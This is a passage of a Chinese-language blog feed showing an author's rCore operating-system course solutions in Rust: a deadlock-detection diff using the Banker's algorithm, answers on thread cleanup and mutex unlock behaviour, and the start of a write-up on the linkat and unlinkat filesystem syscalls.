inserted">+</span><span class="token line">    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">    drop(task);</span><span class="token prefix inserted">+</span><span class="token line">    </span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    sem.up();</span><span class="token prefix unchanged"> </span><span class="token line">    0</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>@@ -165,8 +257,89 @@ pub fn sys_semaphore_down(sem_id: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    let process = current_process();</span><span class="token prefix unchanged"> </span><span class="token line">    let process_inner = process.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">    let sem = Arc::clone(process_inner.semaphore_list[sem_id].as_ref().unwrap());</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    let task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    task_inner.sem_need = sem_id;</span><span class="token prefix inserted">+</span><span class="token line">    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">    drop(task);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    if process_inner.dlcheck_option &#123;</span><span class="token prefix inserted">+</span><span class="token line">        // initialize data structure for Banker's Algorithm:</span><span class="token prefix inserted">+</span><span class="token line">        // Avavilable Vector, Allocation Matrix, Need Matrix</span><span class="token prefix inserted">+</span><span class="token line">        let n = process_inner.tasks.len();</span><span class="token prefix inserted">+</span><span class="token line">        let m = process_inner.semaphore_list.len();</span><span class="token prefix inserted">+</span><span class="token line">        let mut available:Vec&lt;usize> = Vec::new();</span><span class="token prefix inserted">+</span><span class="token line">        for sem_opt in &amp;process_inner.semaphore_list &#123;</span><span class="token prefix inserted">+</span><span class="token line">            match sem_opt &#123;</span><span class="token prefix inserted">+</span><span class="token line">                Some(sem) => &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    let sem_inner = sem.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">                    available.push(max(sem_inner.count, 0) as usize);</span><span class="token prefix inserted">+</span><span class="token line">                    drop(sem_inner);</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">                None => available.push(0),</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let mut allocation: Vec&lt;Vec&lt;usize>> = vec![vec![0; m]; n];</span><span class="token prefix inserted">+</span><span class="token line">        for (i, task_opt) in process_inner.tasks.iter().enumerate() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            match task_opt &#123;</span><span class="token prefix inserted">+</span><span class="token line">                Some(task) => &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    let task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">                    for (id, alloc) in &amp;task_inner.sem_allocation &#123;</span><span class="token prefix inserted">+</span><span class="token line">                        allocation[i][*id] += *alloc;</span><span class="token prefix inserted">+</span><span class="token line">                    &#125;</span><span class="token prefix inserted">+</span><span class="token line">                    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">                None => &#123;&#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let mut need: Vec&lt;Vec&lt;usize>> = vec![vec![0; m]; n];</span><span class="token prefix inserted">+</span><span class="token line">        for (i, task_opt) in process_inner.tasks.iter().enumerate() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            match task_opt &#123;</span><span class="token prefix inserted">+</span><span class="token line">                Some(task) => &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    let task_inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">                    let nid = task_inner.sem_need;</span><span class="token prefix inserted">+</span><span class="token line">                    if nid != usize::MAX &#123;</span><span class="token prefix inserted">+</span><span class="token line">                        need[i][nid] += 1;</span><span class="token prefix inserted">+</span><span class="token line">                    &#125;</span><span class="token prefix inserted">+</span><span class="token line">                    drop(task_inner);</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">                None => &#123;&#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        if !deadlock_check(available, allocation, need) &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return -0xDEAD;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    </span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    drop(process_inner);</span><span class="token prefix unchanged"> </span><span class="token line">    sem.down();</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    0</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line">/// condvar create syscall</span></span>@@ -246,6 +419,81 @@ pub fn sys_condvar_wait(condvar_id: usize, mutex_id: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">///</span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement deadlock detection, but might not all in this syscall</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_enable_deadlock_detect(_enabled: usize) -> isize &#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    trace!("kernel: sys_enable_deadlock_detect NOT IMPLEMENTED");</span><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    trace!("kernel: sys_enable_deadlock_detect");</span><span class="token prefix inserted">+</span><span class="token line">    let process = current_process();</span><span class="token prefix inserted">+</span><span class="token line">    let mut process_inner = process.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    let mut flag = 0;</span><span class="token prefix inserted">+</span><span class="token line">    match _enabled &#123;</span><span class="token prefix inserted">+</span><span class="token line">        0 => process_inner.dlcheck_option = false,</span><span class="token prefix inserted">+</span><span class="token line">        1 => process_inner.dlcheck_option = true,</span><span class="token prefix inserted">+</span><span class="token line">        _ => flag = -1,</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    drop(process_inner);</span><span class="token prefix inserted">+</span><span class="token line">    flag</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">/// Banker's Algoritm for dead lock check</span><span class="token prefix inserted">+</span><span class="token line">fn deadlock_check(available: Vec&lt;usize>, allocation: Vec&lt;Vec&lt;usize>>, need: Vec&lt;Vec&lt;usize>>) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">    // n: thread count  m: resources count</span><span class="token prefix inserted">+</span><span class="token line">    let (n, m) = (allocation.len(), allocation[0].len());</span><span class="token prefix inserted">+</span><span class="token line">    let mut work = available;</span><span class="token prefix inserted">+</span><span class="token line">    let mut finish = vec![false; n];</span><span class="token prefix inserted">+</span><span class="token line">    loop &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut idx = usize::MAX;</span><span class="token prefix inserted">+</span><span class="token line">        for i in 0..n &#123;</span><span class="token prefix inserted">+</span><span class="token line">            let mut flag = true;</span><span class="token prefix inserted">+</span><span class="token line">            if finish[i] &#123;</span><span class="token prefix inserted">+</span><span class="token line">                continue;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">            for j in 0..m &#123;</span><span class="token prefix inserted">+</span><span class="token line">                if need[i][j] > work[j] &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    flag = false;</span><span class="token prefix inserted">+</span><span class="token line">                    break;</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">            if flag &#123;</span><span class="token prefix inserted">+</span><span class="token line">                idx = i;</span><span class="token prefix inserted">+</span><span class="token line">                break;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        // has found a thread meet the requirement</span><span class="token prefix inserted">+</span><span class="token line">        if idx != usize::MAX &#123;</span><span class="token prefix inserted">+</span><span class="token line">            for j in 0..m &#123;</span><span class="token prefix inserted">+</span><span class="token line">                work[j] += allocation[idx][j];</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">            finish[idx] = true;</span><span class="token prefix inserted">+</span><span class="token line">        &#125; else &#123;</span><span class="token prefix inserted">+</span><span class="token line">            break;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    finish.iter().all(|&amp;x| x)</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span>diff --git a/os/src/task/process.rs b/os/src/task/process.rsindex c2be1ce..471c63a 100644<span class="token coord">--- a/os/src/task/process.rs</span><span class="token coord">+++ b/os/src/task/process.rs</span>@@ -49,6 +49,8 @@ pub struct ProcessControlBlockInner &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pub semaphore_list: Vec&lt;Option&lt;Arc&lt;Semaphore>>>,</span><span class="token prefix unchanged"> </span><span class="token line">    /// condvar list</span><span class="token prefix unchanged"> </span><span class="token line">    pub condvar_list: Vec&lt;Option&lt;Arc&lt;Condvar>>>,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// deadlock check option</span><span class="token prefix inserted">+</span><span class="token line">    pub dlcheck_option: bool,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl ProcessControlBlockInner &#123;</span></span>@@ -119,6 +121,7 @@ impl ProcessControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                    mutex_list: Vec::new(),</span><span class="token prefix unchanged"> </span><span class="token line">                    semaphore_list: Vec::new(),</span><span class="token prefix unchanged"> </span><span class="token line">                    condvar_list: Vec::new(),</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                    dlcheck_option: false,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                &#125;)</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;,</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;);</span></span>@@ -245,6 +248,7 @@ impl ProcessControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                    mutex_list: Vec::new(),</span><span class="token prefix unchanged"> </span><span class="token line">                    semaphore_list: Vec::new(),</span><span class="token prefix unchanged"> </span><span class="token line">                    condvar_list: Vec::new(),</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                    dlcheck_option: false,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                &#125;)</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;,</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;);</span></span>diff --git a/os/src/task/task.rs b/os/src/task/task.rsindex 0136098..6818590 100644<span class="token coord">--- a/os/src/task/task.rs</span><span class="token coord">+++ b/os/src/task/task.rs</span>@@ -5,7 +5,9 @@ use super::&#123;kstack_alloc, KernelStack, ProcessControlBlock, TaskContext&#125;;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::trap::TrapContext;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::&#123;mm::PhysPageNum, sync::UPSafeCell&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::&#123;Arc, Weak&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use alloc::vec::Vec;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use core::cell::RefMut;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use core::usize;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// Task control block structure</span><span class="token prefix unchanged"> </span><span class="token line">pub struct TaskControlBlock &#123;</span></span>@@ -41,6 +43,14 @@ pub struct TaskControlBlockInner &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pub task_status: TaskStatus,</span><span class="token prefix unchanged"> </span><span class="token line">    /// It is set when active exit or execution error occurs</span><span class="token prefix unchanged"> </span><span class="token line">    pub exit_code: Option&lt;i32>,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// The resources need of mutex</span><span class="token prefix inserted">+</span><span class="token line">    pub mutex_need: usize, // mutex id need (usize::MAX represents donot need any mutex)</span><span class="token prefix inserted">+</span><span class="token line">    /// The resources need of semaphore</span><span class="token prefix inserted">+</span><span class="token line">    pub sem_need: usize,   // semaphore id need (usize::MAX represents donot need any semaphore)</span><span class="token prefix inserted">+</span><span class="token line">    /// The resources allocated of mutex</span><span class="token prefix inserted">+</span><span class="token line">    pub mutex_allocation: Vec&lt;usize>,         // elem: mutex id allocated</span><span class="token prefix inserted">+</span><span class="token line">    /// The resources allocated of semaphore</span><span class="token prefix inserted">+</span><span class="token line">    pub sem_allocation: Vec&lt;(usize, usize)>,  // elem: (sem id allocated, count allocated)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl TaskControlBlockInner &#123;</span></span>@@ -75,6 +85,10 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                    task_cx: TaskContext::goto_trap_return(kstack_top),</span><span class="token prefix unchanged"> </span><span class="token line">                    task_status: TaskStatus::Ready,</span><span class="token prefix unchanged"> </span><span class="token line">                    exit_code: None,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                    mutex_need: usize::MAX,</span><span class="token prefix inserted">+</span><span class="token line">                    sem_need: usize::MAX,</span><span class="token prefix inserted">+</span><span class="token line">                    mutex_allocation: Vec::new(),</span><span class="token prefix inserted">+</span><span class="token line">                    sem_allocation: Vec::new(),</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                &#125;)</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;,</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span></span></code></pre><h1 id="问答作业"><a href="#问答作业" class="headerlink" title="问答作业"></a>问答作业</h1><h2 id="t1"><a href="#t1" class="headerlink" title="t1"></a>t1</h2><p>在我们的多线程实现中，当主线程 (即 0 号线程) 退出时，视为整个进程退出， 此时需要结束该进程管理的所有线程并回收其资源。</p><p><strong>Q1:</strong> 需要回收的资源有哪些？</p><p><strong>A1:</strong> 线程控制块、线程栈、互斥锁、信号量、条件变量等。</p><p><strong>Q2:</strong> 其他线程的 <code>TaskControlBlock</code> 可能在哪些位置被引用，分别是否需要回收，为什么？</p><p><strong>A2:</strong> 线程同步原语中，例如 rCore 信号量的等待队列 <code>wait_queue</code> 中，它们需要被回收，否则可能导致死锁或其他并发问题。</p><h2 id="t2"><a href="#t2" class="headerlink" title="t2"></a>t2</h2><p><strong>Q:</strong> 对比以下两种 <code>Mutex.unlock</code> 的实现，二者有什么区别？这些区别可能会导致什么问题？</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">impl</span> <span class="token class-name">Mutex</span> <span class="token keyword">for</span> <span class="token class-name">Mutex1</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> mutex_inner <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>inner<span class="token punctuation">.</span><span class="token function">exclusive_access</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert!</span><span class="token punctuation">(</span>mutex_inner<span class="token punctuation">.</span>locked<span class="token punctuation">)</span><span class="token punctuation">;</span>        mutex_inner<span class="token punctuation">.</span>locked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>waking_task<span class="token punctuation">)</span> <span class="token operator">=</span> mutex_inner<span class="token punctuation">.</span>wait_queue<span class="token punctuation">.</span><span class="token function">pop_front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">add_task</span><span class="token punctuation">(</span>waking_task<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">Mutex</span> <span class="token keyword">for</span> <span class="token class-name">Mutex2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> mutex_inner <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>inner<span class="token punctuation">.</span><span class="token function">exclusive_access</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert!</span><span class="token punctuation">(</span>mutex_inner<span class="token punctuation">.</span>locked<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>waking_task<span class="token punctuation">)</span> <span class="token operator">=</span> mutex_inner<span class="token punctuation">.</span>wait_queue<span class="token punctuation">.</span><span class="token function">pop_front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">add_task</span><span class="token punctuation">(</span>waking_task<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            mutex_inner<span class="token punctuation">.</span>locked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>A:</strong> </p><p>对于 <code>Mutex1</code>，如果有多个线程在等待锁，并且 <code>Mutex1</code> 解锁后立即唤醒一个等待的线程，而此时另一个线程已经获取了锁，那么被唤醒的线程可能会发现锁已经被其他线程持有，从而再次进入等待状态。这会导致不必要的额外等待和上下文切换。例如，假设线程 A 持有锁并解锁，线程 B 和 C 都在等待队列中。线程 A 解锁后，<code>mutex_inner.locked</code> 被设置为 <code>false</code>，然后唤醒线程 B。但在线程 B 开始执行之前，线程 C 已经获取了锁。此时，线程 B 会发现锁已被线程 C 持有，不得不重新进入等待队列。</p><p>对于 <code>Mutex2</code>，如果它解锁时有等待的任务，<code>mutex_inner.locked</code> 不会被设置为 <code>false</code>。这意味着当被唤醒的任务开始执行时，它会看到 <code>locked</code> 仍然是 <code>true</code>，尽管锁实际上已经被释放了。这种情况可能导致被唤醒的任务无法正确获取锁，因为它会认为锁仍然被其他线程持有，从而再次进入等待队列。这会导致死锁或无限循环。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;编程作业&quot;&gt;&lt;a href=&quot;#编程作业&quot; class=&quot;headerlink&quot; title=&quot;编程作业&quot;&gt;&lt;/a&gt;编程作业&lt;/h1&gt;&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="Rust" scheme="http://lordaeronesz.github.io/tags/Rust/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>2024开源操作系统训练营 rCore Chapter6练习</title>
    <link href="http://lordaeronesz.github.io/2024/11/03/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter6%E7%BB%83%E4%B9%A0/"/>
    <id>http://lordaeronesz.github.io/2024/11/03/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter6%E7%BB%83%E4%B9%A0/</id>
    <published>2024-11-03T15:30:11.000Z</published>
    <updated>2024-11-04T11:44:26.267Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编程作业"><a href="#编程作业" class="headerlink" title="编程作业"></a>编程作业</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="linkat"><a href="#linkat" class="headerlink" title="linkat"></a>linkat</h3><p>本实验需要实现 3 个与文件系统相关的系统调用，首先是用来创建文件硬链接的 <code>linkat</code>.</p><p>首先介绍一下什么是硬链接，硬链接作为一种抽象概念，可以看作指向一个文件实体的指针，类似于 C++ 中的智能指针 <code>shared_ptr</code>。而从内核代码的角度来看，硬链接在文件系统中的实体就是 <strong>文件目录项</strong> 。每个硬链接对应一个目录项，这个目录项指向一个相同的索引节点（inode），每个 inode 存储了文件的实际数据块（的指针）及其元数据（文件大小、文件类型等）。</p><p>由于 rCore 的文件系统被简化为单级目录（只包含根目录），因此实现 <code>linkat</code> 的思路就很清晰了：根据文件名 <code>old_name</code> 查找其对应的 inode，获取 inode_id 并将引用计数加一，创建一个新的目录项 <code>(new_name, inode_id)</code>，将其插入根目录的数据段末尾。</p><p>需要注意的是，rCore 文件系统的 inode 分为虚拟文件系统层的 <code>Inode</code> 和在持久化设备（硬盘）上实际存储的 <code>DistInode</code>，可以通过 <code>Inode</code> 所实现的 <code>read_disk_inode</code> 和 <code>modify_disk_inode</code> 读取或修改其对应的 <code>DiskInode</code>。因此实际的代码实现，可以按照以下几个步骤进行：</p><ol><li>使用 <code>self.find(old_name)</code> 查找当前目录（<code>ROOT_DIR</code>）下的名为 <code>old_name</code> 的文件对应的 <code>Inode</code>，引用名为 <code>inode</code>。</li><li>使用 <code>self.read_disk_inode()</code> 获取当前目录的 <code>DiskInode</code> 的只读引用。获取当前目录下 <code>old_name</code> 文件的 inode_id；获取当前目录的文件数据（目录的文件数据全部由目录项构成）的总大小，记为 <code>offset</code>，用于最后将新目录项添加至末尾。</li><li>使用 <code>inode.modify_disk_inode</code> 获取 <code>old_name</code> 文件的 <code>DiskInode</code> 的可变引用。将其引用计数（原本没有该字段，需要自行添加）加一。</li><li>创建新的目录项，并使用 <code>self.write_at</code> 将其写入偏移量为 <code>offset</code> 的位置。</li></ol><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// Create a hard link with new_name for file with old_name</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">linkat</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> old_name<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">,</span> new_name<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">isize</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// get inode of file with old_name</span>    <span class="token keyword">let</span> inode <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>old_name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> inode<span class="token punctuation">.</span><span class="token function">is_none</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> inode <span class="token operator">=</span> inode<span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> id <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token comment">// inode id</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token comment">// last position of data of inode</span>    <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">read_disk_inode</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>dinode<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>        id <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">find_inode_id</span><span class="token punctuation">(</span>old_name<span class="token punctuation">,</span> dinode<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        offset <span class="token operator">=</span> dinode<span class="token punctuation">.</span>size <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    inode<span class="token punctuation">.</span><span class="token function">modify_disk_inode</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>dinode<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>        dinode<span class="token punctuation">.</span>nlink <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">// increase reference count</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> new_entry <span class="token operator">=</span> <span class="token class-name">DirEntry</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>new_name<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// insert a new directory entry into ROOT_DIR</span>    <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">write_at</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> new_entry<span class="token punctuation">.</span><span class="token function">as_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token number">0</span><span class="token punctuation">&#125;</span></code></pre><h3 id="unlinkat"><a href="#unlinkat" class="headerlink" title="unlinkat"></a>unlinkat</h3><p>第二个需要实现的是取消硬链接的 <code>unlinkat</code>，基本思路为：根据文件名 <code>name</code> 查找对应的 inode，将引用计数减一，最后将其根目录下对应的目录项移除。下面直接介绍具体实现方法：</p><ol><li>使用 <code>self.find(name)</code> 查找当前目录（<code>ROOT_DIR</code>）下的名为 <code>name</code> 的文件对应的 <code>Inode</code>，引用名为 <code>inode</code>。</li><li>使用 <code>inode.modify_disk_inode()</code> 获取 <code>inode</code> 文件的 <code>DiskInode</code> 的可变引用。将引用计数减一，如果引用计数减为零，代表该文件的所有硬链接都被解除，此时可以使用 <code>inode.clear()</code> 释放该文件 inode 和数据的内存空间。</li><li>使用 <code>self.modify_disk_inode()</code> 获取当前目录的 <code>DiskInode</code> 的可变引用。遍历当前目录下的所有目录项，将名称为 <code>name</code> 的目录项移除（为了实现的方便，可以直接用空的目录项覆写）。</li></ol><blockquote><p>在我的测试中，使用 <code>inode.clear()</code> 清空文件 inode 和数据内存空间的操作可能会在测试样例 <code>ch6_file3</code> 处超时，但测试样例不会对此进行测试，因此如果出现超时的情况，可以考虑移除这一操作。</p></blockquote><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// Remove a hard link with name</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">unlinkat</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">isize</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// get inode of file with name</span>    <span class="token keyword">let</span> inode <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> inode<span class="token punctuation">.</span><span class="token function">is_none</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token 